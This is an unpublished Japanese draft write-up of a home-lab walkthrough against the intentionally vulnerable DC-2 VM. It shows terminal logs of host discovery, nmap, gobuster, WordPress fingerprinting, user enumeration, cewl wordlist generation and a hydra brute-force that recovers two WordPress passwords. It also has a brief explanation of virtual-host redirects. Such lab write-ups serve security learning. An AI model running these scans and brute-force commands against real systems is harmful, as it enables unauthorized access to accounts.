---
title: "仮"
emoji: "💻"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: []
published: false
---
┌─[✗]─[user@parrot]─[~]
└──╼ $ip -4 a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
       valid_lft 63384sec preferred_lft 63384sec
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 192.168.56.107/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s8
       valid_lft 575sec preferred_lft 575sec

       ┌─[user@parrot]─[~]
└──╼ $for ip in $(seq 1 254); do (ping -c 1 192.168.56.$ip 2> /dev/null | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &); done
192.168.56.100
192.168.56.107
192.168.56.110

┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $sudo nmap -sC -sV $IP --open -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-20 18:39 JST
Nmap scan report for 192.168.56.110
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
MAC Address: 08:00:27:0B:F4:E8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.19 seconds

┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $sudo nmap -sC -sV 192.168.56.100 --open -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-20 18:54 JST
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.59 seconds

なぜIPアドレスのままではアクセスできなかったのか
ターゲットである「DC-2」の中で動いているWebサーバー（おそらくWordPressなど）が、「名前ベースのバーチャルホスト」という仕組みを採用している、あるいは内部で特定のホスト名へのリダイレクト（転送）設定がされているからです！

お姉様がブラウザに「192.168.56.110」と打ち込んでアクセスすると、サーバー側は「IPアドレスでのアクセスは受け付けない設定になっている。正しいホスト名（例えば『dc-2』など）でアクセスし直して！」とブラウザに指示を出します。
しかし、お姉様のParrotOSはローカルの実験ネットワークにいるため、「dc-2」というホスト名がどのIPアドレスを指しているのかを解決してくれるDNSサーバーが存在しません。その結果、名前解決に失敗してアクセスエラーになってしまったというわけです！

┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.110:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 298]
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/index.php            (Status: 200) [Size: 53562]
/server-status        (Status: 403) [Size: 302]
/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.56.110/wp-admin/]
/wp-includes          (Status: 301) [Size: 322] [--> http://192.168.56.110/wp-includes/]
/wp-content           (Status: 301) [Size: 321] [--> http://192.168.56.110/wp-content/]
Progress: 4614 / 4615 (99.98%)
/xmlrpc.php           (Status: 405) [Size: 42]
===============================================================
Finished
===============================================================

┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $wig $URL

wig - WebApp Information Gatherer


Scanning http://192.168.56.110:80/...
___________________________________________________ SITE INFO ____________________________________________________
IP               Title                                                                                            
Unknown          DC-2 &#8211; Just another WordPress site                                                       
                                                                                                                  
____________________________________________________ VERSION _____________________________________________________
Name             Versions                                                     Type                                
WordPress        3.8 | 3.8.1 | 3.8.2 | 3.8.3 | 3.8.4 | 3.8.5 | 3.8.6 | 3.8.7  CMS                                 
                 3.8.8 | 3.9 | 3.9.1 | 3.9.2 | 3.9.3 | 3.9.4 | 3.9.5 | 3.9.6                                      
                 4.0 | 4.0.1 | 4.0.2 | 4.0.3 | 4.0.4 | 4.0.5 | 4.1 | 4.1.1                                        
                 4.1.2 | 4.1.3 | 4.1.4 | 4.1.5 | 4.2 | 4.2.1 | 4.2.2                                              
Apache           2.4.10                                                       Platform                            
Debian           8.0                                                          OS                                  
                                                                                                                  
__________________________________________________ INTERESTING ___________________________________________________
URL              Note                                                         Type                                
/wp-login.php    Wordpress login page                                         Interesting                         
/readme.html     Readme file                                                  Interesting                         
                                                                                                                  
_____________________________________________________ TOOLS ______________________________________________________
Name             Link                                                         Software                            
wpscan           https://github.com/wpscanteam/wpscan                         WordPress                           
CMSmap           https://github.com/Dionach/CMSmap                            WordPress                           
                                                                                                                  
________________________________________________ VULNERABILITIES _________________________________________________
Affected         #Vulns                                                       Link                                
WordPress 3.8    12                                                           http://cvedetails.com/version/162922
WordPress 3.8.1  12                                                           http://cvedetails.com/version/162923
WordPress 3.8.2  7                                                            http://cvedetails.com/version/176067
WordPress 3.8.3  7                                                            http://cvedetails.com/version/176068
WordPress 3.8.4  8                                                            http://cvedetails.com/version/176069
WordPress 3.9    8                                                            http://cvedetails.com/version/176070
WordPress 3.9.1  15                                                           http://cvedetails.com/version/169908
WordPress 3.9.2  10                                                           http://cvedetails.com/version/176071
WordPress 3.9.3  1                                                            http://cvedetails.com/version/185080
WordPress 4.0    9                                                            http://cvedetails.com/version/176072
WordPress 4.0.1  1                                                            http://cvedetails.com/version/185081
WordPress 4.1    1                                                            http://cvedetails.com/version/185082
WordPress 4.1.1  2                                                            http://cvedetails.com/version/185079
WordPress 4.2    1                                                            http://cvedetails.com/version/185048
WordPress 4.2.1  0                                                            http://cvedetails.com/version/184019
WordPress 4.2.2  2                                                            http://cvedetails.com/version/185073
                                                                                                                  
__________________________________________________________________________________________________________________
Time: 6.4 sec    Urls: 387                                                    Fingerprints: 39241      

┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $sudo nmap -p80 --script http-wordpress-users $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-21 14:30 JST
Nmap scan report for dc-2 (192.168.56.110)
Host is up (0.0017s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-users: 
| Username found: admin
| Username found: tom
| Username found: jerry
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
MAC Address: 08:00:27:0B:F4:E8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds

┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $cewl -m 5 -w dict.txt http://dc-2
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 495 login tries (l:3/p:165), ~31 tries per task
[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect
[80][http-post-form] host: dc-2   login: jerry   password: adipiscing
[STATUS] 421.00 tries/min, 421 tries in 00:01h, 74 to do in 00:01h, 16 active
[80][http-post-form] host: dc-2   login: tom   password: parturient
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18